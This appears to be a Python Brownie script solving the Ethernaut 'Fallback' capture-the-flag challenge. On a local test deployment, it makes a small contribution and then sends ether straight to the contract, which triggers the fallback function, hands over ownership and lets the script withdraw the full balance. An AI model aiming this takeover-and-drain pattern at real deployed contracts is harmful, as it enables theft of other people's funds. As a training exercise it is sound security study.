import os
from brownie import *
from web3 import Web3
# function to deploy contract
def deploy_fallback(owr):
    # deploy contract
    sc = Fallback.deploy({'from':owr})
    return sc

# function to add contribution higher than owner
def add_contribution(sc, owner):
    # aproch, first contribute 1 time and then send ether to the contract itself 
    tx_contribute = sc.contribute({'from':accounts[2], 'value':990000000000000})
    accounts[2].transfer(sc.address, 50000000000000000000)

    print("Contract Balance: ", sc.balance())
    print("Owner", sc.owner())


def withdraw_balance(sc):
    print('Balance contract, ', sc.balance())
    sc.withdraw({'from':accounts[2]})
    print('Balance contract after withdraw, ', sc.balance())
    print('Balance of user 2, ', accounts[2].balance())
def main():
    # deployer and first owner
    owner = accounts[0]
    # deploy contract
    contract = deploy_fallback(owner)
    # add contribution and get ownership
    add_contribution(contract, owner)
    withdraw_balance(contract)
